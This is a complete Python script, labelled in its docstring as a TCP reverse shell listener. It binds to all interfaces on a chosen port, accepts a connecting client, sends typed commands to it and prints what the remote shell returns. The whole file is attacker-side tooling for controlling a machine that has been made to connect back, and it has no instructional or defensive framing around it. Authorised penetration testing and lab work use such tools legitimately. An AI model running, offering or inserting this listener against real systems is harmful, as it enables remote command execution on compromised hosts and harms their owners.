"""TCP reverse shell listener"""
import socket, sys, threading, select

def listen_shell(sock, host, port):
    print(f"[*] Listening on {host}:{port}")
    sock.bind((host, port))
    sock.listen(1)
    
    while True:
        client, addr = sock.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        print("    Type 'exit' to drop shell, Ctrl+C to quit\n")
        
        client.setblocking(False)
        buffer = b""
        
        try:
            while True:
                ready, _, _ = select.select([sys.stdin, client], [], [])
                for r in ready:
                    if r is sys.stdin:
                        cmd = sys.stdin.readline()
                        if not cmd:
                            continue
                        cmd = cmd.strip()
                        if cmd.lower() == 'exit':
                            print("[-] Dropped")
                            client.close()
                            break
                        client.send((cmd + '\n').encode())
                    else:
                        try:
                            data = client.recv(4096)
                            if not data:
                                raise ConnectionResetError
                            sys.stdout.buffer.write(data)
                            sys.stdout.buffer.flush()
                        except (ConnectionResetError, OSError):
                            print("[-] Disconnected")
                            client.close()
                            break
                else:
                    continue
                break
        except KeyboardInterrupt:
            print("\n[!] Quit")
            sock.close()
            sys.exit(0)

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4445
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listen_shell(s, '0.0.0.0', port)
    except KeyboardInterrupt:
        s.close()
        sys.exit(0)
